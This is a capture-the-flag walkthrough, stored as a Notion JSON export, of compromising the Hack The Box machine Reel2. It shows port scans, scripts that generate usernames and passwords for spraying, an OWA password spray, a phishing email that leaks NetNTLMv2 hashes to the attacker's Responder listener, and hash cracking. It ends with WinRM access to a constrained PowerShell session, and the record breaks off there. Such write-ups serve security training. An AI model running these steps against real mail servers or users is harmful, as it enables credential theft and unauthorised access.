{"children":[{"children":[],"uri":"https://www.notion.so/bb706ad23fc54df0bc7b7729da32224d","type":"heading","createdTime":1616222333130,"lastEditedTime":1616222280000,"title":[["Recon"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/f8ff90a82d6e4ce7a05c5a22a602ea42","type":"text","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["$ nmap -p- 10.10.10.210 > ports.nmap",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/80a4ff268fff4f64af2b1025a808d3fc","type":"code","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["PORT     STATE SERVICE\n80/tcp   open  http\n443/tcp  open  https\n5985/tcp open  wsman\n6001/tcp open  X11:1\n6002/tcp open  X11:2\n6004/tcp open  X11:4\n6005/tcp open  X11:5\n6006/tcp open  X11:6\n6007/tcp open  X11:7\n6008/tcp open  X11:8\n6010/tcp open  x11\n6011/tcp open  x11\n6012/tcp open  x11\n6017/tcp open  xmail-ctrl\n6022/tcp open  x11\n8080/tcp open  http-proxy"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/73e44bf631fc412a8cbc06bf9d0aa11b","type":"bulleted_list","createdTime":1616222333130,"lastEditedTime":1616222280000,"title":[["Port scan:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/2bf6bdb58f3f4088abb35c4ecb046d14","type":"text","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["$ nmap -sC -sV -p 22,80 10.10.10.210 > targeted.nmap",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/7009c78680a741398535d11df463b10c","type":"code","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["PORT     STATE SERVICE    VERSION\n80/tcp   open  http       Microsoft IIS httpd 8.5\n|_http-server-header: Microsoft-IIS/8.5\n|_http-title: 403 - Forbidden: Access is denied.\n443/tcp  open  ssl/http   Microsoft IIS httpd 8.5\n| http-methods: Microsoft IIS httpd 8.5\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/8.5\n|_http-title: IIS Windows Server\n| ssl-cert: Subject: commonName=Reel2\n| Subject Alternative Name: DNS:Reel2, DNS:Reel2.htb.local\n| Not valid before: 2020-07-30T10:12:46\n|_Not valid after:  2025-07-30T10:12:46\n|_ssl-date: 2021-02-05T12:32:31+00:00; +29s from scanner time.\n5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n6001/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0\n6002/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0\n6004/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0\n6005/tcp open  msrpc      Microsoft Windows RPC\n6006/tcp open  msrpc      Microsoft Windows RPC\n6007/tcp open  msrpc      Microsoft Windows RPC\n6008/tcp open  msrpc      Microsoft Windows RPC\n6010/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0\n6011/tcp open  msrpc      Microsoft Windows RPC\n6012/tcp open  msrpc      Microsoft Windows RPC\n6017/tcp open  msrpc      Microsoft Windows RPC\n6022/tcp open  msrpc      Microsoft Windows RPC\n8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.32)\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n| http-open-proxy: Potentially OPEN proxy.\n|_Methods supported:CONNECTION\n|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.32\n|_http-title: Welcome | Wallstant\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows"]],"language":"Nix","wrap":false},{"children":[],"uri":"https://www.notion.so/6eb66e5029dd4a5da448fff96f681d53","type":"text","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["Microsoft IIS httpd 8.5, WinRM over HTTP, Microsoft Windows RPC over HTTP, Apache httpd 2.4.43."]]}],"uri":"https://www.notion.so/ccd40337dfea418897ce4f3d29bf9d05","type":"bulleted_list","createdTime":1616222333130,"lastEditedTime":1616222280000,"title":[["Targeted scan:"]]},{"children":[],"uri":"https://www.notion.so/8c43bf32ede545828a4bbefbb13ad660","type":"heading","createdTime":1616222333130,"lastEditedTime":1616222280000,"title":[["Enumeration"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/dce7f4dceb3941ca83cd2b189b5fbf49","type":"code","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["10.10.10.210  reel2.htb"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/ab063745dda847eb8c5c922bf73ef8be","type":"bulleted_list","createdTime":1616222333130,"lastEditedTime":1616222280000,"title":[["Add hostname to "],["/etc/hosts",[["c",null]]],[":"]]},{"children":[],"uri":"https://www.notion.so/bc592653711d434d97e062107d01053c","type":"text","createdTime":1616222333130,"lastEditedTime":1616222280000,"title":[["Port 80 Enumeration",[["b",null]]]]},{"children":[],"uri":"https://www.notion.so/6e11b1585916470d85813735b38e1df2","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Index page displays 403 Forbidden. With a simple "],["gobuster",[["c",null]]],[" scan revealing nothing else of interest, let's move on..."]]},{"children":[],"uri":"https://www.notion.so/2648ea94c9104cc09e50391ef12fe39f","type":"text","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Port 443 Enumeration",[["b",null]]]]},{"children":[],"uri":"https://www.notion.so/db35ebc68da247edb360ef38b9175faa","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Website displays default IIS page."]]},{"children":[{"children":[],"uri":"https://www.notion.so/e5e44d355f0d486fb0b413c44dd171a6","type":"text","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["$ gobuster dir -u http://reel2.htb -t 50 -w ../Common/directory-list-2.3-medium.txt -x .php,.html -b 403",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/94b56d9ea654437e804f826dc7b3604b","type":"code","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["/owa (Status: 301)\n/powershell (Status: 401)"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/2c255c7164b1498d87c63e07b27a3a7e","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Running "],["gobuster",[["c",null]]],[", blacklisting status code 403 as it is the default response:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/995747403c6948a2a1f6152e903e83f6","type":"image","createdTime":1616222333135,"lastEditedTime":1616222280000,"source":"https://i.imgur.com/mwmjjBb.png?width=528","caption":[],"width":528,"height":-1,"fullWidth":false,"pageWidth":false,"aspectRatio":-1,"preserveScale":true}],"uri":"https://www.notion.so/5453ef832b0749abbba122903bdef7eb","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Found Outlook Web App and "],["/powershell",[["c",null]]],[" console, both requiring authorized access with credentials."]]},{"children":[],"uri":"https://www.notion.so/1e90a5f4e06747b6af8ea31c7cfe729d","type":"text","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Port 8080 Enumeration",[["b",null]]]]},{"children":[],"uri":"https://www.notion.so/f48b7582956e4519ac16bc3c246cbd10","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Website is hosting an instance of Wallstant, an open source PHP-based social network."]]},{"children":[{"children":[],"uri":"https://www.notion.so/89e4339fc71545f5aebca44f6be351a3","type":"code","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["Fast & Secure from the most common PHP vulnerabilities not 100% but good for now"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/cb979db3fd7e4e1cb2f5c7a6dcbf38ee","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["From Wallstant project website on "],["https://wallstant.github.io/:",[["a","https://wallstant.github.io/:"]]]]},{"children":[],"uri":"https://www.notion.so/e4cf06e8d62a47ad94b698ab6d18f9d9","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Only the \"most common\" vulnerabilities? That doesn't sound very promising..."]]},{"children":[],"uri":"https://www.notion.so/78938effd496463bb97a169d452aa1c9","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Registering for an account, no email authentication was required."]]},{"children":[{"children":[],"uri":"https://www.notion.so/996d70e36663449b8df0d888c82dc5da","type":"code","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["cube0x0 cube0x0\ncube cube\nsven svensson\nlars larsson\njenny adams\nteresa trump"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/577fd1d5cc284714a1b3b44359079416","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Discovering usernames, first name, and last name combinations on Wallstant, saving to "],["names.txt",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/dc10c1273ca6467d8767cd1cf95f1cdb","type":"code","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[[">2020\nEnjoying a fika with @egre55"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/56870e6ca23949cba8d4f3a2cf95a3fe","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Post by cube (6 months ago):"]]},{"children":[{"children":[],"uri":"https://www.notion.so/89bf39c18f0046c99b6709aaf5a4c9d8","type":"code","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[[">2020\nThis summer is so hot!"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/4663ad838cd141b1a0ca6c2ef3882999","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Post by sven (6 months ago):"]]},{"children":[{"children":[],"uri":"https://www.notion.so/7f22cb3efa2a4f6fa94508856640242d","type":"text","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["fika, summer, hot, 2020",[["c",null]]]]}],"uri":"https://www.notion.so/37d046f49a1b4c2b837d66767a5bb767","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Collecting keywords from user posts:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/acb49f0c8934436a8a6626d1ee70eeea","type":"code","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["#!/usr/bin/env python\nimport sys\nimport os.path\n\ndef usergen():\n    output = open('users.txt', 'w')\n\n    for line in open(sys.argv[1]):\n        name = ''.join([c for c in line if c == \" \" or c.isalpha()])\n\n        tokens = name.lower().split()\n\n        # Skip empty lines\n        if len(tokens) < 1:\n            continue\n\n        fname = tokens[0]\n        lname = tokens[-1]\n\n        print(fname + lname, file=output)           # johndoe\n        print(lname + fname, file=output)           # doejohn\n        print(fname + \".\" + lname, file=output)     # john.doe\n        print(lname + \".\" + fname, file=output)     # doe.john\n        print(fname[0] + \".\" + lname, file=output)  # j.doe\n        print(lname[0] + \".\" + fname, file=output)  # d.john\n        print(fname[0] + lname, file=output)        # jdoe\n        print(lname[0] + fname, file=output)        # djohn\n        print(fname + lname[0], file=output)        # johnd\n        print(lname + fname[0], file=output)        # doej\n        print(fname, file=output)                   # john\n        print(lname, file=output)                   # doe\n    print(\"[+] Done! Output saved as users.txt\")\n\nif __name__ == \"__main__\":\n    # Check arguments\n    if len(sys.argv) != 2:\n        print(\"[-] Usage: {} names.txt\".format(sys.argv[0]))\n        sys.exit(0)\n    if not os.path.exists(sys.argv[1]):\n        print(\"[-] {} not found\".format(sys.argv[1]))\n        sys.exit(0)\n\n    usergen()"]],"language":"Python","wrap":false}],"uri":"https://www.notion.so/d3f553c9d3d74b53b964edea01574887","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Create "],["usergen.py",[["c",null]]],[" script for generating username combinations "],["users.txt",[["c",null]]],[" to be used in password spraying attack:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/5956c43a798841cb89ce4dc35e547ede","type":"code","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["#!/usr/bin/env python\nimport sys\nimport os.path\n\ndef passgen():\n    output = open('passwords.txt', 'w')\n\n    for line in open(sys.argv[1]):\n        password = ''.join([c for c in line if c == \" \" or c.isalpha()])\n\n        print(password + \"2020\", file=output)                           # password2020\n        print(password[0].upper() + password[1:] + \"2020\", file=output) # Password2020\n    print(\"[+] Done! Output saved as passwords.txt\")\n\nif __name__ == \"__main__\":\n    # Check arguments\n    if len(sys.argv) != 2:\n        print(\"[-] Usage: {} words.txt\".format(sys.argv[0]))\n        sys.exit(0)\n    if not os.path.exists(sys.argv[1]):\n        print(\"[-] {} not found\".format(sys.argv[1]))\n        sys.exit(0)\n\n    passgen()"]],"language":"Python","wrap":false}],"uri":"https://www.notion.so/6867c41a91a8441b955187be431c767b","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Create "],["passgen.py",[["c",null]]],[" script for generating potential passwords:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/8f047f823a714045887ddda4bcbf844a","type":"text","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["$ python usergen.py names.txt",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/6f3bc6e6798545d6be1db9459b86673d","type":"code","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["[+] Done! Output saved as users.txt"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/83d192f6338a4ce59309a7ef0e78befe","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Run "],["usergen.py",[["c",null]]],[" script with "],["names.txt",[["c",null]]],[" as parameter:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/b64e5ada20c6498eb41bdca428273a35","type":"text","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["$ python passgen.py words.txt",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/ac30ed5419a2436aaa0d875abc820952","type":"code","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["[+] Done! Output saved as passwords.txt"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/4142d4e663e04e28b33eff08a1eb4446","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Run "],["passgen.py",[["c",null]]],[" script with "],["words.txt",[["c",null]]],[" as parameter:"]]},{"children":[],"uri":"https://www.notion.so/e8c6696c29ec47659845a97b59286002","type":"heading","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Exploitation"]],"depth":2},{"children":[],"uri":"https://www.notion.so/fcc999b7c27143919592a04857a7ebf0","type":"text","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["OWA Password Spraying",[["b",null]]]]},{"children":[{"children":[],"uri":"https://www.notion.so/caab78ba332043bd8ae11d78e76e9104","type":"text","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["$ ruler -d reel2.htb -k brute -u users.txt -p passwords.txt -d 0 -v",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/82258ef12b1f4ee4bdc4be324e229741","type":"code","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["[+] Starting bruteforce\n[+] Trying to Autodiscover domain\n[+] 0 of 7 passwords checked\n...\nFailed: svensvensson:Summer2020\nFailed: svenssonsven:Summer2020\nFailed: sven.svensson:Summer2020\nFailed: svensson.sven:Summer2020\n[+] Success: s.svensson:Summer2020"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/25afc7090e6f416a92ab656e6fdb2c17","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Password spray attack with "],["ruler",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/674cae79873b42a5bcae3cff6c0163ff","type":"text","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["s.svensson:Summer2020",[["c",null]]]]}],"uri":"https://www.notion.so/d26a6af5a67944bf892be34ce79d1cd6","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["After a few minutes, we get the credentials:"]]},{"children":[],"uri":"https://www.notion.so/a5392214eb7c4e86afeb037ad8d1b288","type":"bulleted_list","createdTime":1616222333131,"lastEditedTime":1616222280000,"title":[["Login to Outlook Web App with brute-forced credentials as s.svensson."]]},{"children":[{"children":[],"uri":"https://www.notion.so/c490a5a04e4d4b59abcd68c285e53489","type":"numbered_list","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["Open options menu with \"Alternativ\" on top right"]]},{"children":[],"uri":"https://www.notion.so/dd5f27a7938d4367819d754d38f2e4ac","type":"numbered_list","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["Select \"Nationella inställningar\", then \"Språk\""]]},{"children":[],"uri":"https://www.notion.so/0b662fc90fad4b9c9a2031c9daec6230","type":"numbered_list","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["Save by clicking \"Spara\""]]}],"uri":"https://www.notion.so/e883832946de49b7996ce701571750f2","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["The user interface is in Swedish, it is possible to change the language settings by navigating through:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/7b191d3fc6894783a70977d8bf60fb16","type":"code","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["Version: 14.0.639.21\nClient Access server operating system version: Microsoft Windows NT 6.3.9600.0"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/49a5240a59a346f4a43366339d7ffa8f","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["In the \"About\" section of options, we see the version and info about our target exposed:"]]},{"children":[],"uri":"https://www.notion.so/3d1ade166b13459da59f2c46d06e1a45","type":"text","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["NetNTLMv2 hash stealing using Outlook",[["b",null]]]]},{"children":[],"uri":"https://www.notion.so/100ca5da18e34fed9c67fc037be112e8","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["This version of Outlook is outdated and vulnerable to SMB attachment phishing (<15.0.1497)."]]},{"children":[],"uri":"https://www.notion.so/e67b9ecc63fa411b8d4bdf6b0685c10d","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["It is possible to craft an email that steals the victim's NetNTLMv2 hashes without requiring any user interaction, clicking on the email to preview it is enough for the hashes to be stolen."]]},{"children":[{"children":[],"uri":"https://www.notion.so/d7f9b83fc4b64a2daf681505e20184cf","type":"text","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["http://10.10.14.103",[["a","http://10.10.14.103/"]]]]}],"uri":"https://www.notion.so/83cde9a51d7446e89c3c8c9e5673f786","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Create a phishing email with only an URL to our HTTP server in the body, the subject can be anything we would like:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/3be254c5784445ae8ec57b6f7707559e","type":"image","createdTime":1616222333135,"lastEditedTime":1616222280000,"source":"https://i.imgur.com/8NiocHd.png?width=576","caption":[],"width":576,"height":-1,"fullWidth":false,"pageWidth":false,"aspectRatio":-1,"preserveScale":true}],"uri":"https://www.notion.so/b18dcbbbb99a49e08f3983d69f5813bc","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["In the \"To:\" tab, select all users. Untick the Administrator to avoid detection, and the Directory Search Mailbox as it is usually undeliverable. Don't forget to include users on the second page:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/3e17649d1d2b4b2bb5cb3c51512f803a","type":"image","createdTime":1616222333135,"lastEditedTime":1616222280000,"source":"https://i.imgur.com/9b2AomC.png?width=624","caption":[],"width":624,"height":-1,"fullWidth":false,"pageWidth":false,"aspectRatio":-1,"preserveScale":true}],"uri":"https://www.notion.so/9031037c9c4f4a518eec8b8a01defeed","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["The resulting phishing email should look something resembling this:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/da55e8711bfd43fa966b389478292550","type":"text","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["$ sudo responder -I tun0 -v",[["c",null]]]]}],"uri":"https://www.notion.so/821e4933e9e64bcda4f220d9fd3aa8b6","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Before sending the message, listen for the incoming SMB packets containing the NTLM hash with "],["responder",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/b840e25d7ebe4166951fabefa5147c5c","type":"code","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["[HTTP] Sending NTLM authentication request to 10.10.10.210\n[HTTP] POST request from: 10.10.10.210     URL: /\n[HTTP] Host             : 10.10.14.103\n[HTTP] NTLMv2 Client   : 10.10.10.210\n[HTTP] NTLMv2 Username : htb\\k.svensson\n[HTTP] NTLMv2 Hash     : k.svensson::htb:674b7f83c29a5106:FAED26E7B1A28ACCC1ED389076CBE92D:01010000000000007DD6001790FCD601FACF82A2C3EE7698000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000000000000400000A5F56C688795519E9E05DF97F15DAB3A15A7751DF89F12E22C8747E1E867CE530A001000000000000000000000000000000000000900220048005400540050002F00310030002E00310030002E00310034002E003100300033000000000000000000"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/d94099b46b28474689e316acabe0e8d8","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Send the message, and after a few minutes, we should get k.svensson's NTLM hash in "],["responder",[["c",null]]],[":"]]},{"children":[],"uri":"https://www.notion.so/423193ac3ec84380970514c90b9c9e42","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Looks like Sven's brother Knut Svensson clicked on our phishing email. Save the NTLM hash to a "],["knut.hash",[["c",null]]],[" file."]]},{"children":[{"children":[],"uri":"https://www.notion.so/18b37b8379704ff78c298929733a8272","type":"text","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["$ hashcat -h",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/4fbc0b9e67d94a008351a0d7ada4e94c","type":"code","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["5600 | NetNTLMv2 | Network Protocols"]],"language":"Nix","wrap":false},{"children":[],"uri":"https://www.notion.so/a2797cd8f5b747449e06ab25a15fafcc","type":"text","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["$ hashcat -m 5600 knut.hash ~/Desktop/rockyou.txt -d 3",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/0b231f9b87ad438ea316ed11def82203","type":"code","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["K.SVENSSON::htb:674b7f83c29a5106:faed26e7b1a28accc1ed389076cbe92d:01010000000000007dd6001790fcd601facf82a2c3ee7698000000000200060053004d0042000100160053004d0042002d0054004f004f004c004b00490054000400120073006d0062002e006c006f00630061006c000300280073006500720076006500720032003000300033002e0073006d0062002e006c006f00630061006c000500120073006d0062002e006c006f00630061006c000800300030000000000000000000000000400000a5f56c688795519e9e05df97f15dab3a15a7751df89f12e22c8747e1e867ce530a001000000000000000000000000000000000000900220048005400540050002f00310030002e00310030002e00310034002e003100300033000000000000000000:kittycat1"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/46f14d41b84a4475b64f5a6f07ec6950","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Cracking k.svensson's NTLM hash with "],["hashcat",[["c",null]]],[" after checking the hash type:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/d80027fbea094f679d6ba258ac79d880","type":"text","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["k.svensson:kittycat1",[["c",null]]]]}],"uri":"https://www.notion.so/88c915d555464562afe7fa6fc57795ad","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Get credentials:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/4ef923e0880e45cdb40821c12cc3b943","type":"text","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["$ evil-winrm -i 10.10.10.210 -u k.svensson -p kittycat1",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/3de2e20994e84bab9fe74d3abca0d028","type":"code","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["Evil-WinRM shell v2.3\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS The term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\n    + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException\n    + FullyQualifiedErrorId : CommandNotFoundException"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/e0d5b423b7d44e0e8edf4454a5ef6613","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Remote into the machine with "],["evil-winrm",[["c",null]]],[" using k.svensson's credentials:"]]},{"children":[],"uri":"https://www.notion.so/b999bb0db25042bb95e962e5469c7ea2","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Looks like we connected successfully, but we're in a restricted shell and cannot execute any commands."]]},{"children":[],"uri":"https://www.notion.so/e880e3d3a5e8498f837aba8ca8d17403","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Since "],["evil-winrm",[["c",null]]],[" relies on "],["Invoke-Expression",[["c",null]]],[" to send our commands, we will have to remote in manually with "],["Enter-PSSession",[["c",null]]],[" on a separate Powershell session instead."]]},{"children":[{"children":[],"uri":"https://www.notion.so/bcae33063bd5449fa9b7f8104ebd9831","type":"text","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["$ yay -S powershell-bin",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/95e2b0cdae4a4d3ba32e61fe991b496e","type":"text","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["$ yay -S gss-ntlmssp",[["c",null]]]]}],"uri":"https://www.notion.so/5c69ac35a62746a696163595c02605d6","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Install Powershell and GSSAPI libraries from AUR:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/7c549d2f69cf4b8d8ba7edcd7c29a933","type":"text","createdTime":1616222333135,"lastEditedTime":1616222280000,"title":[["$ pwsh",[["c",null]]]]}],"uri":"https://www.notion.so/e0adb0d2d70340f98bc456c5205eb0cb","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Start a Powershell session:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/c9dd1a02f3bd453790519c1c347294f8","type":"text","createdTime":1616222333136,"lastEditedTime":1616222280000,"title":[["> $session = New-PSSession -ComputerName 10.10.10.210 -Authentication Negotiate -Credential k.svensson",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/685b211c18004852a1188dd8e423c886","type":"code","createdTime":1616222333136,"lastEditedTime":1616222280000,"title":[["PowerShell credential request\nEnter your credentials.\nPassword for user k.svensson: *********"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/efe11ef312994a2487a30175159de7a0","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Create a session variable and enter the cracked password:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/6fadb88c6b6a46be977e5758147ef5a5","type":"text","createdTime":1616222333136,"lastEditedTime":1616222280000,"title":[["> Enter-PSSession $session",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/80f9e106e545428dadedacb4e5837c09","type":"code","createdTime":1616222333136,"lastEditedTime":1616222280000,"title":[["[10.10.10.210]: PS>_"]],"language":"PowerShell","wrap":false}],"uri":"https://www.notion.so/83c7c17fddea4eb2851fa18928fee811","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Enter the session:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/d18d7fc9eddf442281ac8363e1d3dffb","type":"text","createdTime":1616222333136,"lastEditedTime":1616222280000,"title":[["> $ExecutionContext.SessionState.LanguageMode",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/7fb7db5cefaa4fb29477ee244c2cbfc7","type":"code","createdTime":1616222333136,"lastEditedTime":1616222280000,"title":[["ConstrainedLanguage"]],"language":"PowerShell","wrap":false}],"uri":"https://www.notion.so/5f94d60826da433b972a82f24ca29dff","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["As expected, normal commands like "],["dir",[["c",null]]],[", "],["cd",[["c",null]]],[", "],["type",[["c",null]]],[" are not working in the restricted session, we can check this by:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/512b112d0cbc42b990f751117c8aeee8","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["> &{whoami /all}",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/310b1251262048c2849d67513c55a644","type":"code","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["USER INFORMATION\n----------------\nUser Name      SID\n============== =============================================\nhtb\\k.svensson S-1-5-21-158661246-3153678129-2567348495-1165"]],"language":"Nix","wrap":false},{"children":[],"uri":"https://www.notion.so/3820e7329a404632b5601522081c5eb2","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["> 